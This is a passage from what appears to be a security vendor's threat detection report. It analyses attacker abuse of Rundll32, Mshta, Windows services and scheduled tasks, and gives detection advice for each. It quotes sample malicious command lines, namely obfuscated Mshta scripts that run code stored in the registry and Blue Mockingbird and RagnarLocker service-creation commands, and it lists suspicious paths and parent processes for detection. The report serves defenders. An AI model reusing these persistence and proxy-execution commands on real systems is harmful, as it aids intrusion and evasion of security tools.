in.\n\nFrom a practical standpoint, Rundll32 enables the execution of native dynamic\n\nlink libraries (DLL). Executing malicious code as a DLL allows an adversary\n\nto keep their malware from appearing directly in a process tree, as a directly\n\nexecuted EXE would. Additionally, adversaries are known to abuse export\n\nfunctionality in legitimate DLLs, including those that can facilitate connection\n\nto network resources to bypass proxies and evade detection. Under certain\n\nconditions, particularly if you lack controls for blocking DLL loads, the execution\n\nof malicious code through Rundll32 can bypass application controls.\n\nBeyond DLLs, Rundll32 can also execute JavaScript via the\n\n**[RunHtmlApplication function.](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)**\n\n###### How do adversaries use Rundll32?\n\nAdversaries abuse Rundll32 in a wide variety of ways, so we’ll limit our focus to\n\nvariations we encounter regularly.\n\nAdversaries often leverage Rundll32 to load code from DLLs within world\nwritable directories (e.g., the Windows temp directory), a pattern of behavior\n\nthat you might see from legitimate enterprise software as well as not-so-legit\n\ntools like Cobalt Strike.\n\n[As we’ve covered on the Red Canary blog, adversaries use Rundll32 to load the](https://redcanary.com/blog/dfdr-consulting/)\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 30%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 2,380\n\n###### CONFIRMED THREATS\n\n\n-----\n\nlegitimate comsvcs.dll, which calls the MiniDump function, allowing adversaries\n\nto dump the memory of certain processes. We’ve observed adversaries\n\nleveraging this technique to retrieve cached credentials from lsass.exe, which is\n\nillustrated below.\n\n**DllRegisterServer is a legitimate function of Rundll32 that is used for a variety of**\n\ninnocuous reasons. However, we’ve also seen several threats—from droppers for\n\nQbot, Dridex, and others to ransomware such as Egregor and Maze—leverage it\n\nas a mechanism to bypass application controls. The following illustrates\n\na generic example of an adversary using DllRegisterServer to bypass\n\napplication controls.\n\nAnother detectable example we encounter frequently with Rundll32 involves\n\nCobalt Strike, which leverages the StartW function to load DLLs from the\n\ncommand line. The use of that export function is a telltale sign you are dealing\n\nwith Cobalt Strike. The following is an example of what that might look like:\n\nIn what might be an example of a malicious scheduled task, we’ve also observed\n\nbackdoors that leverage taskeng.exe to spawn Rundll32 and execute malicious\n\ncode.\n\n\n-----\n\nLast and perhaps least frequently, we observe a decent amount of USB worm\n\nactivity wherein Rundll32 executes in conjunction with a command line\n\ncontaining non-alphanumeric or otherwise unusual command-line characters.\n\nWe most frequently see this with Gamarue, as in the example below.\n\n##### Detection\n\n###### Collection requirements\n\n Command-line monitoring\n\nProcess command-line parameters are one of the most reliable sources to detect\n\nmalicious use of Rundll32, since you need to pass command-line arguments for\n\nRundll32 to execute.\n\n###### Process monitoring\n\nProcess monitoring is another fruitful data source for observing malicious\n\n\n-----\n\nexecution of Rundll32. Understanding the context in which Rundll32 executes is\n\ncritically important to an investigation. Sometimes the execution of Rundll32 by\n\nitself won’t be enough to determine malicious intent, and that’s when you can\n\nrely on process lineage to gain additional context.\n\n###### Detection suggestions\n\nSome successful analytics for detecting malicious use of Rundll32 include\n\nthe following:\n\n###### Execution from world-writable folders\n\nSince adversaries will try to use Rundll32 to load or write DLLs from world or\n\nuser-writable folders, it makes sense to watch for rundll32.exe writing or loading\n\nfiles to or from any of the following locations:\n\n**•** **%APPDATA%**\n\n**•** **%PUBLIC%**\n\n**•** **%ProgramData%**\n\n**•** **%TEMP%**\n\n**•** **%windir%\\system32\\microsoft\\crypto\\rsa\\machinekeys**\n\n**•** **%windir%\\system32\\tasks_migrated\\microsoft\\windows\\pla\\system**\n\n**•** **%windir%\\syswow64\\tasks\\microsoft\\windows\\pla\\system**\n\n**•** **%windir%\\debug\\wia**\n\n**•** **%windir%\\system32\\tasks**\n\n**•** **%windir%\\syswow64\\tasks**\n\n**•** **%windir%\\tasks**\n\n**•** **%windir%\\registration\\crmlog**\n\n**•** **%windir%\\system32\\com\\dmp**\n\n**•** **%windir%\\system32\\fxstmp**\n\n**•** **%windir%\\system32\\spool\\drivers\\color**\n\n**•** **%windir%\\system32\\spool\\printers**\n\n**•** **%windir%\\system32\\spool\\servers**\n\n**•** **%windir%\\syswow64\\com\\dmp**\n\n**•** **%windir%\\syswow64\\fxstmp**\n\n**•** **%windir%\\temp**\n\n**•** **%windir%\\tracing**\n\n###### Export functionalities\n\nYou should also consider monitoring for instances of rundll32.exe running\n\nWindows native DLLs that have export functionalities that adversaries commonly\n\n\n###### T 1 2 1 8 . 0 1 1 : R U N D L L 3 2\n\n“Adversaries may abuse rundll32.exe\n\nto proxy execution of malicious code.\n\nUsing rundll32.exe, vice executing\n\ndirectly (i.e., Shared Modules), may\n\navoid triggering security tools that may\n\nnot monitor execution of the rundll32.\n\nexe process because of allowlists or\n\nfalse positives from normal operations.\n\nRundll32.exe is commonly associated\n\nwith executing DLL payloads.”\n\n\n-----\n\nleverage for executing malicious code and evading defensive controls.\n\n###### Rundll32 without a command line\n\nRundll32 does not normally execute without corresponding command-line\n\narguments and while spawning a child process. Given this, you may want to\n\nalert on the execution of processes that appear to be rundll32.exe without any\n\ncommand-line arguments, especially when they spawn child processes or make\n\nnetwork connections.\n\n###### Unusual process lineage\n\nAs is the case with most techniques in this report, it’s critical that you are able\n\nto take stock of what is normal in your environment if you hope to be able\n\nto identify what isn’t. In the context of Rundll32, you’ll want to monitor for\n\nexecutions of rundll32.exe from unusual or untrusted parent processes. This\n\nwill vary from one organization to another, but some examples of process that\n\nusually won’t spawn Rundll32 might include:\n\n- Microsoft Office products (e.g., winword.exe, excel.exe, msaccess.exe, etc.)\n\n**•** **lsass.exe**\n\n**•** **taskeng.exe**\n\n**•** **winlogon.exe**\n\n**•** **schtask.exe**\n\n**•** **regsvr32.exe**\n\n**•** **wmiprvse.exe**\n\n**•** **wsmprovhost.exe**\n\n###### Weeding out false positives\n\nWhile process monitoring and command-line parameters are great sources\n\nfor telemetry that can be useful for detecting malicious Rundll32, they require\n\nenvironment-specific tuning. As you can imagine, Rundll32 is used by many\n\nlegitimate tools. To avoid flooding your security team with a ton of false\n\npositives, establish a baseline on what activity is normal in your environment\n\nand then write rules that will exclude the known activity. This is a great starting\n\npoint, but keep in mind that these analytics will likely require a lot of tuning and\n\nmonitoring to get to the point where they reliably produce high-fidelity alerting.\n\n\n###### Rodrigo Garcia\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nRodrigo is a detection engineer at\n\nRed Canary, where he spends his\n\ntime finding new threats, building\n\nautomation to reduce workloads,\n\nand delivering consistent threat\n\ndetections to customers and partners.\n\nPrior to Red Canary, Rodrigo worked\n\nat General Electric in various roles\n\nspanning incident response, detector\n\ndevelopment, and threat hunting. In his\n\nspare time, he enjoys working on smart\n\nhome automation, playing tennis,\n\ntraveling, and spending time with\n\nhis family.\n\n\n-----\n\n###### T E C H N I Q U E T 1 2 1 8 . 0 0 5\n\n##### Mshta\n\nMshta is attractive to adversaries both in the early and latter stages of an\ninfection because it enables them to proxy the execution of arbitrary code\nthrough a trusted utility.\n\n##### Analysis\n\n###### Why do adversaries use Mshta?\n\nMshta.exe is a Windows-native binary designed to execute Microsoft HTML\n\n[Application (HTA) files. As its full name implies, Mshta can execute Windows](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10))\n\n**[Script Host code (VBScript and JScript) embedded within HTML in a network](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10))**\n\nproxy-aware fashion. These capabilities make Mshta an appealing vehicle for\n\nadversaries to proxy execution of arbitrary script code through a trusted, signed\n\nutility, making it a reliable technique during both initial and later stages of an\n\ninfection.\n\n###### How do adversaries use Mshta?\n\nThere are four primary methods by which adversaries leverage Mshta to execute\n\narbitrary VBScript and JScript:\n\n- inline via an argument passed in the command line to Mshta\n\n- [file-based execution via an HTML Application (HTA) file and](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wiaaut/-wiaaut-getting-started-samples) **[COM-based](https://codewhitesec.blogspot.com/2018/07/lethalhta.html)**\n\n**[execution for lateral movement](https://codewhitesec.blogspot.com/2018/07/lethalhta.html)**\n\n- [by calling the RunHTMLApplication export function of mshtml.dll with](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)\n\n**rundll32.exe as an alternative to mshta.exe**\n\nThe two most commonly abused Mshta technique variations we observed in\n\n2020 were inline and file-based execution.\n\nInline execution of code doesn’t require the adversary to write additional files\n\nto disk. VBScript or JScript can be passed directly to Mshta via the command\n\n[line for execution. This behavior gained notoriety several years ago with Kovter](https://blogs.blackberry.com/en/2018/01/threat-spotlight-kovter-malware-fileless-persistence-mechanism)\n\n**[malware, remnants of which we still observed in 2020 despite this threat](https://blogs.blackberry.com/en/2018/01/threat-spotlight-kovter-malware-fileless-persistence-mechanism)**\n\n[vanishing from the landscape following the 2018 indictment and arrest of the](https://www.justice.gov/usao-edny/pr/two-international-cybercriminal-rings-dismantled-and-eight-defendants-indicted-causing)\n\n**[operators. Here’s an example of Kovter persistence in action:](https://www.justice.gov/usao-edny/pr/two-international-cybercriminal-rings-dismantled-and-eight-defendants-indicted-causing)**\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 18.8%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 738\n\n###### CONFIRMED THREATS\n\n\n-----\n\nUrsnif has used similar inline execution combined with code stored in the\n\n**[registry as part of its multistage initial access. Zscaler put out a great report](https://attack.mitre.org/techniques/T1112/)**\n\ndetailing Ursnif’s technique shift from PowerShell to Mshta. Notice the use of\n\n**ActiveXObject and regread in both the Kovter example above and the Ursnif**\n\nexample below. Key terms like these make for reliable detection logic and are a\n\ngood indication that Mshta is being mischievous.\n\nConversely, some adversaries choose to execute code stored in a file.\n\nAdversaries can direct Mshta to execute HTA content stored in a local or remote\n\nfile by passing a location on disk, a URI, or a Universal Naming Convention (UNC)\n\npath (i.e., a path prefixed with \\\\ that points to a file share or hosted WebDAV\n\nserver) to the file in the command line. This technique is popular because the\n\nmalicious payload is not directly visible in the command line, as it is with inline\n\nexecution, and permits the execution of remotely hosted HTA content in a\n\nproxy-aware fashion. One threat we observed leveraging this technique in 2020\n\n[dropped Remcos via HTA content hidden behind a shortened URL:](https://attack.mitre.org/software/S0332/)\n\n\n-----\n\n###### Emerging Mshta tradecraft\n\nAdversaries know that defenders are aware of Mshta’s potential for abuse.\n\nTherefore, it’s no surprise that in 2020 we observed an increase in adversary\n\ntechniques to disguise Mshta execution and evade brittle detection logic. The\n\nAgent Tesla, Azorult, Lockbit, Lokibot, and Ursnif malware families all used inline\n\nexecution of VBScript or JScript, or file-based execution of HTA content in files\n\nthat did not have the commonly associated .hta file extension. This is because\n\nMshta will execute HTA content in files with any extension (or none at all) as long\n\n[as the file extension is not mapped to a text/plain MIME type (e.g., Mshta will not](https://tools.ietf.org/html/rfc1521#page-28)\n\nexecute a file with a .txt extension). To further disguise Mshta execution, TA551\n\nrenamed the binary in attempts to evade detection logic, which relied on Mshta\n\nexecuting with its expected filename of mshta.exe.\n\n##### Detection\n\n###### Collection requirements\n\n Process and command-line monitoring\n\nMonitoring process execution and command-line parameters will offer\n\ndefenders visibility into many behaviors associated with malicious abuse of\n\nMshta. Similarly, process lineage is also helpful for detecting adversary use of\n\nMshta. At a minimum, collect parent-child process relationships, and, if possible,\n\nconsider collecting information about “grandparent” relationships too.\n\n###### Process metadata\n\nWe observed multiple adversaries this year renaming the Mshta binary to\n\nevade brittle detection logic. While we cover this extensively in our analysis\n\nof T1036.003: Rename System Utilities, binary metadata like internal process\n\nnames are an effective data source to determine the true identity of a\n\ngiven process.\n\n###### File monitoring and  network connections\n\nFile monitoring and network connections—sometimes used in conjunction with\n\none another—are also useful data sources for defenders seeking to observe\n\npotentially malicious Mshta abuse.\n\n\n###### T 1 2 1 8 . 0 0 5 : M S H T A\n\n“Adversaries may abuse mshta.exe to\n\nproxy execution of malicious .hta files\n\nand Javascript or VBScript through\n\na trusted Windows utility. There are\n\nseveral examples of different types of\n\nthreats leveraging mshta.exe during\n\ninitial compromise and for execution of\n\ncode. Mshta.exe is a utility that executes\n\nMicrosoft HTML Applications (HTA) files.\n\nHTAs are standalone applications that\n\nexecute using the same models and\n\ntechnologies of Internet Explorer, but\n\noutside of the browser.”\n\n\n-----\n\n###### Detection suggestions\n\nTwo fundamental and complementary ways that you can think about detection\n\nfor a given technique are to:\n\n1. Build analytics around the ways you’ve observed or otherwise know that\n\nadversaries have leveraged a technique in the past\n\n2. Identify all of the possible variations in the way a technique can be\n\n[leveraged, a process discussed in detail in this blog post, and develop](https://redcanary.com/blog/threat-research-questions/)\n\nmethods for detecting variations that deviate from what you expect\n\nIn our experience, it’s best to combine these two strategies while setting\n\npriorities that ensure that you have sufficient coverage against actualized threats\n\nin the wild.\n\n###### Inline script execution and  protocol handlers\n\nMshta permits a user to execute inline Windows Script Host (WSH) script code\n\n(i.e., VBScript and JScript). The way that Mshta then interprets that code is\n\n[dependent on the specified protocol handle, which is a component of Windows](https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-prot-implementing)\n\nthat tells the operating system how to parse and interpret protocol paths (e.g.,\n\n**http:, ftp:, javascript:, vbscript:, about:, etc.).**\n\nDefenders can build detection analytics for inline Mshta script execution around\n\nthese protocol handlers appearing in the command line. A specific detection\n\nexample for this would be to look for the execution of mshta.exe in conjunction\n\nwith a command line containing any of the protocol handlers that are relevant to\n\nMshta: javascript, vbscript, or about, to name a few options. The following offers\n\nan example of what that might look like in the wild:\n\n```\nvbscript:\nCreateObject(“WScript.Shell”).Run(“notepad.exe”)(window.close)\njavascript:\ndxdkDS=”kd54s”;djd3=newActiveXObject(“WScript.Shell”);vs3skdk=”dK3”;\nsdfkl3=djd3. RegRead(“HKCU\\\\software\\\\\nklkndk32lk”);esllnb3=”3m3d”;eval(asdfkl2);dkn3=”dks”;\nabout:\nabout:<script>asdfs31=”sdf2”;ssdf2=new ActiveXObject(“WScript.\nShell”);df2verew=”sdfSDF”;ddlk3nj=ssdf2.RegRead(“HKCU\\\\software\\\\asdf\\\\\nasdfs”);asdfs=”asdfasd”;eval(ddlk3nj);asdfsd=”Tslkjs”;</script>\n\n```\n\n-----\n\n###### Suspicious process ancestry\n\nWhile Mshta execution can be pretty common across an environment, there\n\nare a handful of process lineage patterns that warrant alerting. For example,\n\nan adversary conducting a phishing attack might embed a macro in a Microsoft\n\nWord document that executes a malicious HTA file. Given that there are very\n\nfew cases in which Word should be spawning Mshta, it makes sense to alert\n\nwhen winword.exe spawns mshta.exe. In 2020, we observed TA551 delivering\n\nweaponized Word documents that executed Mshta as a child process (note that\n\nin this case Mshta was renamed to calc[.]com—more on that below):\n\nAnother example of suspicious process ancestry would be Mshta spawning\n\nother scripting engines, like PowerShell, as child processes. As such, looking for\n\n**mshta.exe launching powershell.exe could serve as a high-fidelity detection**\n\nanalytic for a specific behavior. The following Kovter persistence example does\n\njust this, with the HTA code pulled from the registry subsequently spawning an\n\ninstance of PowerShell:\n\n###### Mshta masquerading\n\nAs is illustrated in the image above (where mshta is masquerading as calc[.]\n\n**com), adversaries will occasionally rename Mshta to evade short-sighted**\n\ndetection logic. In these cases, defenders can bolster their detection of Mshta\n\nabuse by alerting on activity where the internal binary name is consistent with\n\n**mshta.exe but the apparent filename is not. A renamed instance of Mshta**\n\nshould be highly suspicious and provide a high signal-to-noise analytic.\n\nIn 2020, we observed adversaries not only renaming Mshta but also moving\n\nit out of its normal location in the System32 or SysWOW64 directories. In\n\n\n-----\n\naddition to building analytics that look for inconsistencies between internal\n\nand apparent names, defenders should develop analytics looking for Mshta\n\nexecuting from locations other than C:\\Windows\\System32\\. In this example\n\nfrom testing, mshta.exe is renamed notepad.exe, which could fool detection\n\nanalytics that don’t account for the possibility of masquerading:\n\n```\nC:\\Test\\notepad.exe “javascript:a=new\nActiveXObject(“WScript.Shell”);a.Run(“powershell.\nexe%20-nop%20-Command%20Write-Host%20f83a289e8218-459c-9ddb-ccd3b72c732a;%20Start-Sleep%20\n-Seconds%202;%20exit”,0,true);close();”\n\n```\n\nAlso note that the above example includes the javascript protocol handler,\n\nmeaning that this style of detection will complement and provide added context\n\nto the protocol handler detection ideas listed above.\n\n###### Network connections and HTA content\n\nNormal file-based execution of Mshta content is typically observed on disk\n\nand executes HTA content in files ending with the .hta file extension. Detection\n\nanalytics targeting the execution of remotely hosted HTA content—either via\n\nURI or UNC path, from an alternate data stream, or from files without the .hta\n\nextension—can provide defenders with high-signal analytics.\n\nA behavioral analytic that might be helpful in certain environments is to simply\n\nlook for mshta.exe executing and making an external network connection.\n\nOf course, you’ll need to baseline against normal behaviors and tune out\n\nalerting that comes from legitimate software. Another detection opportunity\n\nrelates instances of Mshta downloading and executing HTA content from a URI.\n\nWhen looking for this technique variation, make sure to look for HTA content\n\nregardless of whether it has the expected .hta file extension.\n\nAdditionally, file monitoring data sources that provide a file’s MIME type is\n\nparticularly useful for identifying HTA files masquerading as other file types. HTA\n\nfiles normally have a MIME type of application/hta. Detection analytics built\n\naround identifying HTA content in files without the typical .hta extension can\n\nprovide high-fidelity detections.\n\n\n-----\n\n###### Weeding out false positives\n\nDetection analytics that are based on mshta.exe spawning untrusted or\n\nunsigned binaries can be especially prone to high numbers of false positives.\n\nThis can be alleviated in parts by effectively tuning detection logic to account for\n\nrelated activity that is benign in your environment.\n\n\nAs a detection engineer for Red\n\nCanary’s Cyber Incident Response\n\nTeam, Jesse works alongside a talented\n\nteam dedicated to quickly identifying\n\nand remediating threats in customer\n\nenvironments. He enjoys dissecting\n\nmalware and adversary techniques to\n\nhelp improve the Red Canary detection\n\nengine. Jesse holds a Master’s of\n\nProfessional Studies in Cybersecurity\n\nand Information Assurance from The\n\nPennsylvania State University. In his\n\nspare time, he enjoys restoring old cars\n\nand spending time with his family.\n\n###### Corbin Roof\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nCorbin helps to provide 24x7 coverage\n\nfor Red Canary customers. His\n\nbackground includes malware analysis,\n\ncomputer programming, and network\n\nadministration. Corbin is also a\n\nmusician and burgeoning blogger who\n\nenjoys sharing a unique perspective on\n\ncybersecurity and music.\n\n\n-----\n\n###### T E C H N I Q U E T 1 5 4 3\n\n##### Create or Modify  System Process\n\nCreate or Modify System Process ranks third this year thanks in large part to\n\n\n###### OVERALL RANK\n\n#### 32.8%\n\n\ndetections associated with its Windows Service sub-technique.\n\n\n**T 1 0 5 9 . 0 0 1**\n\n###### Windows Service\n\n\n###### 4.9% 3,324\nORGANIZATIONS AFFECTED CONFIRMED THREATS\n\nTypically, Windows services automatically run with elevated\nprivileges during the boot cycle of the operating system, granting\nadversaries a means of both persistence and privilege escalation.\n\n\n###### ORGANIZATIONS AFFECTED\n\n#### 3,197\n\n\n###### CONFIRMED THREATS\n\n\n**S E E M O R E  >**\n\n\n###### T 1 5 4 3 : C R E AT E O R M O D I F Y S Y S T E M P R O C E S S\n\n“Adversaries may create or modify system-level processes to repeatedly execute\n\n\nmalicious payloads as part of persistence. When operating systems boot up, they can\n\nstart processes that perform background system functions. On Windows and Linux,\n\n\nthese system processes are referred to as services. On macOS, launchd processes\n\nknown as Launch Daemon and Launch Agent are run to finish system initialization and\n\n\nload user specific parameters.”\n\n\n-----\n\n###### T E C H N I Q U E T 1 5 4 3 . 0 0 3\n\n##### Windows Service\n\nWindows Service made it into our top 10 thanks to a single threat: Blue\nMockingbird, an activity cluster we identified that deploys Monero\ncryptocurrency-mining payloads and leverages Windows services for\npersistence.\n\n##### Analysis\n\n###### Why do adversaries use  Windows Service?\n\nWindows services are imperative to the normal functions of the operating\n\nsystem. They are common binaries that run in the background and are typically\n\nnot cause for alarm when executed. Since Windows services already exist on\n\nthe system, an adversary who is able to modify or install a new service is less\n\nlikely to draw attention to their activities than an adversary who installs and\n\nruns an unknown binary or spawns a command from a command or scripting\n\ninterpreter.\n\nOutside of assisting in concealing malicious activity, Windows services typically\n\nrun automatically during the boot cycle of the operating system and with\n\nelevated privileges. This provides the adversary two distinct benefits:\n\n- a means of persistence using an executable under their control that can\n\nautomatically start and remain on indefinitely\n\n- a reliable means to leverage elevated permissions\n\n**[MITRE ATT&CK scopes the Windows Service technique to the creation or](https://redcanary.com/mitre-attack/)**\n\nmodification of the services, while the execution of a service falls under our\n\nninth most prevalent technique in 2020, T1569.002: Service Execution. The two\n\ntechniques rely on each other, but considering them separately allows defenders\n\nto think about how threats and detection strategies differ.\n\nIn order to achieve service execution, an adversary must first install a new\n\nservice or modify an existing one, meaning they must have the requisite\n\npermissions to do so. The choice between creation and modification is a matter\n\nof preference, practicality, and opportunity. When choosing whether to create\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 4.9%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 3,324\n\n###### CONFIRMED THREATS\n\n\n-----\n\nor modify an existing service, an adversary may consider—or be implicitly bound\n\nby—the following criteria:\n\n- Do their tools support service creation and/or modification?\n\n- If a defender might monitor for service creation, could modification offer\n\nadditional evasion opportunities?\n\n- Would it be more evasive to modify an existing service than to create a\n\nnew service?\n\n- If an adversary does not have permissions to create or modify a service\n\n[directly, are any existing services configured in an insecure fashion that](https://attack.mitre.org/techniques/T1574/011/)\n\nwould permit tampering and, ultimately, privilege escalation?\n\n- Is service creation easier and less prone to error or system instability?\n\n###### How do adversaries use  Windows Service?\n\nThe majority of detections show adversaries using Windows services to\n\nestablish a persistence mechanism, ensuring that their script or file will\n\ncontinue to run. A common pattern is the use of the Windows Service Control\n\nManager Configuration Tool (sc.exe) to modify or create a service based on the\n\nadversary’s needs.\n\nThe presence of Windows Service in our top 10 is due almost entirely to a\n\n[single threat: Blue Mockingbird, an activity cluster we identified that deploys](https://redcanary.com/blog/blue-mockingbird-cryptominer/)\n\nMonero cryptocurrency-mining payloads and leverages Windows services for\n\npersistence. Because we counted our top techniques based on the number of\n\ntimes we observed their use, several widespread Blue Mockingbird outbreaks in\n\na few environments caused a large number of Windows services sightings. This\n\nis why the Windows Service technique ranks so highly while affecting a relatively\n\nsmall percentage of customers.\n\nBlue Mockingbird used sc config to modify an existing service named\n\n**wercplsupport to automatically start a malicious DLL named wercplsupporte.**\n\n**dll (an attempt to masquerade by using a slightly different name that defenders**\n\nmight miss):\n\n\ncmd.exe /c sc config wercplsupport start= auto\n```\n& sc start wercplsupport & copy c:\\windows\\\nSystem32\\checkservices.dll c:\\windows\\System32\\\nwercplsupporte.dll /y & start regsvr32.exe /s\nc:\\windows\\System32\\checkservices.dll\n\n```\n\n-----\n\nAnother interesting use of Windows services emerged in 2020 as part of a novel\n\n[technique used by RagnarLocker ransomware. RagnarLocker deployed custom](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)\nvirtual machines to prevent direct analysis of the encryption malware on the\nendpoint. As part of its setup script, RagnarLocker leverages sc.exe to create the\nservice VBoxDRV using these commands:\n\n```\nsc create VBoxDRV binpath= “%binpath%\\drivers\\\nVboxDrv.sys” type= kernel start= auto error=\nnormal displayname= PortableVBoxDRV’\n\n```\n\n##### Detection\n\n###### Collection requirements\n\n Command-line monitoring\n\nThe use of sc.exe to manually create, register, or modify a service is a good\n\nindication of malicious use of Windows services. While there are many methods\n\nof creating and modifying services, adversaries still regularly leverage sc.exe to\n\nperform service operations.\n\nAdversaries also make use of reg.exe to modify service parameters—for\n\nexample, to point an existing service to an adversary-controlled executable.\n\n###### Process monitoring\n\nMuch like process command-line parameters, process monitoring is a reliable\n\nmethod for detecting malicious activity when the services in the environment\n\nare well known and well documented. Processes with randomly generated\n\nnames (especially names consisting exclusively of numbers) may indicate\n\nmalicious services running on the system. For example, Cobalt\n\nStrike, our second most prevalent threat, uses seven alphanumeric characters\n\nin its service name by default, appearing in telemetry in a manner similar\n\nto:\\\\172.0.0.1\\ADMIN$\\1a2b3c4.exe\n\n###### Windows Event Logs\n\nWhile certain event logs will produce a large number of events and hence a large\n\nnumber of false positives, others would be more reliable in detecting malicious\n\nuse of Windows services. Windows Event Logs such as 4697, 7045 and/or 4688\n\n\n###### T 1 5 4 3 . 0 0 3 : W I N D O W S S E R V I C E\n\n“Adversaries may create or modify\n\nWindows services to repeatedly\n\nexecute malicious payloads as part of\n\npersistence. When Windows boots up, it\n\nstarts programs or applications called\n\nservices that perform background\n\nsystem functions. Windows service\n\nconfiguration information, including\n\nthe file path to the service’s executable\n\nor recovery programs/commands, is\n\nstored in the Windows Registry. Service\n\nconfigurations can be modified using\n\nutilities such as sc.exe and Reg.”\n\n\n-----\n\nwill respectively alert on new services and processes being created. In a perfect\n\nworld, this should be fairly quiet, but depending on the environment, what\n\nsystems are being monitored, and how often this type of activity occurs, these\n\nlogs may generate a lot of noise depending on how often software is installed on\n\nmonitored systems.\n\n###### Windows Registry\n\nIn general, anomalous modifications to the registry are a good indication of\n\nmalware or, at the very least, suspicious activity. More specifically, modifications\n\nto HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services may be\n\na good indication of an untrusted or malicious service. As this registry tree\n\nupdates frequently as an artifact of legitimate user-mode service and driver\n\ninstallations, registry monitoring has the potential to generate a large number of\n\nfalse positives without additional context and baselining.\n\n###### File monitoring\n\nFile monitoring can be a useful data source for observing malicious creation\n\nof Windows services, but only if you use it in context with other behavioral\n\nidentifiers or other specific indicators of malware.\n\n###### File monitoring\n\nWhile many Windows Service techniques incorporate similar naming\n\nconventions or binaries across multiple environments, over time these\n\nattributes may and do change. While conventions may help to locate malicious\n\nbehaviors for a short period of time, it is more important to focus on behavioral\n\npatterns than specific commands or names.\n\nYou may be able to detect malicious use of Windows services by monitoring for\n\nand alerting on the following:\n\n- changes within the Service Control Manager registry key: HKEY_LOCAL_\n\n\n**MACHINE\\SYSTEM\\CurrentControlSet\\Services**\n\n\n\n- service binaries loaded from unusual directory paths (e.g., via the PUBLIC\n\nor APPDATA)\n\n- anomalous and unique services being created on a single device or across\n\nthe environment\n\n- suspect creation of a service by the Windows Service Control Manager (e.g.,\n\nservice executables with a low reputation, like those that deviate from an\n\nestablished organizational baseline)\n\n\n-----\n\nTo expand on that last bullet just a bit, one method of assessing executable\n\nreputation is to enable the following Microsoft Defender Attack Surface\n\n[Reduction rule in audit mode: “Block executable files from running unless](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction#block-executable-files-from-running-unless-they-meet-a-prevalence-age-or-trusted-list-criterion)\n\n**[they meet a prevalence, age, or trusted list criterion”. Executables that fail to](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction#block-executable-files-from-running-unless-they-meet-a-prevalence-age-or-trusted-list-criterion)**\n\nmeet an established reputation will be logged accordingly.\n\n###### Weeding out false positives\n\nThe installation of benign software may generate a large number of false\n\npositives for analysts monitoring Windows Event Logs. Similarly, randomly\n\ngenerated benign files or files created in uncommon directories can make a lot\n\nof noise if you’re leveraging a file-monitoring solution. Baselining and enforcing\n\napplication-control solutions can help reduce false positives associated with\n\nboth these data sources.\n\n\n**S E N I O R I N C I D E N T**\n**H A N D L E R**\n\nTaylor Chapman has an extensive\n\nindustry background: before landing at\n\nRed Canary, he started his journey with\n\nMandiant and made a few stops along\n\nthe way to work for industry titans like\n\nSony in Tokyo, Japan and Carbon Black.\n\n###### Ricky Espinoza\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nRicky has more than a decade of\n\nexperience in infosec, with specialities\n\nin incident response, network security,\n\nand vulnerability management. As a\n\ndetection engineer on the Red Canary\n\nCIRT, he tunes detection analytics\n\nand investigates confirmed threats on\n\ncustomers’ environments.\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 5 3\n\n##### Scheduled Task/Job\n\nScheduled Task/Job ranks fourth this year thanks in large part to detections\n\n\n###### OVERALL RANK\n\n#### 32.8%\n\n\nassociated with its Scheduled Task sub-technique.\n\n\n**T 1 0 5 3 . 0 0 5**\n\n###### Scheduled Task\n\n\n###### 27.6% 2,740\nORGANIZATIONS AFFECTED CONFIRMED THREATS\n\nThe primary task-scheduling component of Windows, this technique\nallows adversarial persistence and execution behaviors to blend in\nwith routine activity emanating from native tools and third-party\nsoftware.\n\n\n###### ORGANIZATIONS AFFECTED\n\n#### 3,258\n\n\n###### CONFIRMED THREATS\n\n\n**S E E M O R E  >**\n\n\n###### T 1 0 5 3 : S C H E D U L E D T A S K /J O B\n\n“Adversaries may abuse task scheduling functionality to facilitate initial or recurring\n\n\nexecution of malicious code. Utilities exist within all major operating systems to\n\nschedule programs or scripts to be executed at a specified date and time. A task can\n\n\nalso be scheduled on a remote system, provided the proper authentication is met (ex:\n\nRPC and file and printer sharing in Windows environments). Scheduling a task on a\n\n\nremote system typically requires being a member of an admin or otherwise privileged\n\ngroup on the remote system.”\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 5 3 . 0 0 5\n\n##### Scheduled Task\n\nLeveraging the primary task-scheduling component of Windows, this technique\nallows adversarial persistence and execution behaviors to blend in with routine\nactivity emanating from native tools and third-party software.\n\n##### Analysis\n\n###### Why do adversaries use  Scheduled Task?\n\nAdversaries use scheduled tasks to accomplish two primary objectives:\n\nmaintaining access and executing processes in a specific user context, typically\n\none with elevated privileges. As a wide variety of legitimate software uses\n\nscheduled tasks for an even wider variety of legitimate reasons, malicious\n\nuse often blends in with innocuous use. Scheduled tasks are a functionally\n\nnecessary component of the Windows operating system that can’t just be\n\nturned off or blocked.\n\n###### How do adversaries use  Scheduled Task?\n\n Execution and persistence\n\nOf the approximately 3,000 unique schtasks.exe executions in our detection\n\nset, 99.5 percent included the /Create flag, which makes sense for adversaries\n\nwanting to establish persistence. Closer inspection of the remaining events\n\nreveals one obfuscated instance of /Create, as seen in the following image,\n\nwhich comes from a confirmed Dridex detection:\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 27.6%\n\n###### ORGANIZATIONS 